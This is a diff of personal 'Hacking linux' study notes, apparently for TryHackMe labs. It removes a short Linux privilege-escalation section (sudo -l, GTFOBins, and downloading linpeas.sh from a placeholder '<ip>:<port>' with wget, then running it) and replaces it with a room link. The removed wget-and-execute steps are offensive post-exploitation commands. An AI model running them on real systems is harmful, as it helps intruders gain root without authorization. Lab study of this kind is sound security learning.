@@ -45,8 +45,6 @@ Hacking linux
   - [](#)
   - [](#)
 - [Linux Privilige Escalation 1](#Linux-Privilige-Escalation-1)
-  - [basic](#basic)
-  - [Linpeas](#Linpeas)
   - [Kernel Exploits](#Kernel-Exploits)
   - [Stored Passwords (Config Files)](#Stored-Passwords-Config-Files)
   - [Stored Passwords (History)](#Stored-Passwords-History)
@@ -471,41 +469,9 @@ If you would like to install snmpcheck on your local Linux box, consider the fol
 
 ## Linux Privilige Escalation 1
 
-### basic
-
-Use the command: 
 ```
-sudo -l
+https://tryhackme.com/room/linuxprivescarena
 ```
-to see if you can use any sudo commands. 
-
-if yes you can use websites like 
-```
-https://gtfobins.github.io/
-```
-to see if you can use anything from there to get a privilige escalation to root 
-
-
-### Linpeas 
-very simple. if you can go to a folder (tips is the tmp folder) 
-
-and send the "linpeas.sh" file. 
-
-example command is: 
-```
-wget http://<ip>:<port>/<path or just tha name of the file> 
-```
-then use the next command on the file: 
-```
-chmod +x linpeas.sh
-```
-
-then you can execute the file: 
-```
-./linpeas.sh 
-```
-and then see if you can find anything to get a privilige escalation
-
 
 ### Kernel Exploits 
 
